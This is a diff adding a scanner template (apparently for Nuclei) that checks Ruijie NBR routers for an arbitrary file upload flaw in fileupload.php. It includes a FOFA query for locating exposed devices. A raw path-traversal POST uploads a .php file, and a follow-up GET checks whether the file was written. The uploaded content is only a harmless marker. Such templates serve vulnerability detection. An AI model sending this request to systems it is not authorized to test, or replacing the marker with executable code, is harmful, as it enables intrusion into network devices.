@@ -1,0 +1,39 @@
+id: RuiJieNBR-fileupload-FileUpload
+info:
+  name: 锐捷NBR路由器-fileupload.php-任意文件上传
+  author: candada
+  severity: critical
+  description: description
+  reference:
+    - https://
+  metadata:
+    fofa-query: app="Ruijie-NBR路由器" && icon_hash="-692947551"
+  tags: tags
+
+variables:
+  file_name: "test123456.php"
+  match_str: "test123456"
+
+http:
+  - raw:
+      - |-
+        POST /ddi/server/fileupload.php?uploadDir=../../test&name={{file_name}} HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Host: {{Hostname}}
+        Content-Type: image/jpeg
+
+        {{match_str}}
+      - |
+        GET /test/{{file_name}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200"
+          - "contains(body_2, '{{match_str}}')"
+        condition: and
